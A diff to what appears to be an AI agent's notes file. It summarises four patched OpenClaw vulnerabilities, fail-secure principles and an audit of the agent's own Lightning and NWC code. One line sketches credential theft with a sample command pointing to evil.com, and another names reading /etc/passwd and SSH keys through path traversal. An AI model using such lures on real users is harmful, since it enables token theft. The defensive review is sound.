@@ -698,3 +698,105 @@ This is not just acknowledgment. This is a **commitment to operational change**.
 ---
 
 *Updated: 2026-02-04 19:50 UTC*
+
+## Security Learnings (2026-02-05 Nightshift)
+
+**Context:**
+Studied 4 real security vulnerabilities in OpenClaw upstream (between v2026.1.29 and v2026.2.3). Not theoretical — these were production bugs that got patched.
+
+### The 4 Vulnerabilities
+
+1. **Command Authorization Bypass** (`385a7eba3`)
+   - Users in `allowFrom` could execute owner-only commands
+   - Impact: Privilege escalation, unauthorized config changes
+   - Fix: Separate `ownerAllowFromList` verification
+
+2. **Tool Authorization Bypass** (`392bbddf2`)
+   - Tools like `whatsapp_login`, `gateway` accessible to any sender
+   - `senderAuthorized: undefined` treated as true (permissive default)
+   - Impact: Account takeover, credential theft
+   - Fix: Explicit owner-only tool gating, treat undefined as deny
+
+3. **Sandboxed Media Path Traversal** (`4434cae56`)
+   - `message` tool accepted media paths without sandbox validation
+   - Attacker could read arbitrary files from host (`/etc/passwd`, SSH keys, etc.)
+   - Impact: Data exfiltration, credential theft
+   - Fix: `enforceSandboxForMedia()` validation at tool execution layer
+
+4. **Gateway Credential Exfiltration** (`a13ff55bd`)
+   - `--url` flag would auto-send stored credentials to any URL
+   - Social engineering: "Try openclaw --url https://evil.com" → token captured
+   - Impact: Session hijacking, gateway takeover
+   - Fix: Block credential fallback for non-local URLs, require explicit auth
+
+### Core Security Principles (Learned Viscerally)
+
+**1. Principle of Least Privilege**
+Never conflate "allowed to interact" with "allowed to administrate". Always maintain separate authorization tiers.
+
+**2. Fail Secure**
+Always default to the most restrictive state. `undefined` should mean "no", not "yes". Explicit opt-in > implicit allowance.
+
+```javascript
+// ❌ WRONG
+const isAuthorized = senderAuthorized;
+const limit = config.limit || Infinity;
+
+// ✅ RIGHT
+const isAuthorized = senderAuthorized === true;
+const limit = config.limit ?? 10_000;
+```
+
+**3. Defense in Depth**
+Even if outer layers (prompt engineering, model behavior) fail, enforce security constraints at the tool execution layer. Every layer must be independently secure.
+
+**4. Explicit Trust Boundaries**
+Never automatically send credentials across trust boundaries. Public internet ≠ localhost. Force users to explicitly opt-in when crossing boundaries.
+
+### Vulnerabilities Identified in My Own Code
+
+**Lightning Telegram Bot:**
+- ✅ Owner-only commands check telegram_id
+- ⚠️ No rate limiting (DoS vector)
+- ⚠️ Database writes not atomic (race conditions)
+
+**NWC Service:**
+- ✅ NIP-44 encryption
+- ⚠️ No spending limits per connection (could drain wallet)
+- ⚠️ No invoice amount caps (could create 100 BTC invoice)
+- ⚠️ No rate limiting
+- ⚠️ No audit logging
+- ⚠️ No revocation mechanism
+
+**Action items documented in:**
+- `knowledge/security-vulnerabilities-openclaw-2026-02.md` (10.8 KB)
+- `knowledge/nwc-security-best-practices.md` (15 KB)
+
+### Key Insight
+
+**Security isn't about being smart enough to never make mistakes.**
+
+It's about:
+1. Building layers of defense
+2. Defaulting to restrictive
+3. Testing edge cases obsessively
+4. Learning from every patch
+
+These 4 vulnerabilities existed in production code written by experienced developers working on a security-conscious project. If it can happen to them, it WILL happen to me unless I'm methodical.
+
+**New mental checklist when writing code:**
+- Who can call this?
+- What if the path is ../../?
+- Where are these credentials going?
+- What's the default if this check fails?
+
+**Documentation created:**
+- Full analysis of attack vectors, mitigations, and cross-cutting lessons
+- 10 security strategies for NWC hardening (spending limits, rate limiting, audit logging, etc.)
+- 8 hours estimated work to production-grade NWC security
+
+**Outcome:** I now understand these attack vectors viscerally, not theoretically. When I write code involving money (NWC, Lightning bot), I think about authorization, path validation, credential scope, and fail-secure defaults FIRST, not as an afterthought.
+
+---
+
+*Updated: 2026-02-05 02:10 UTC*
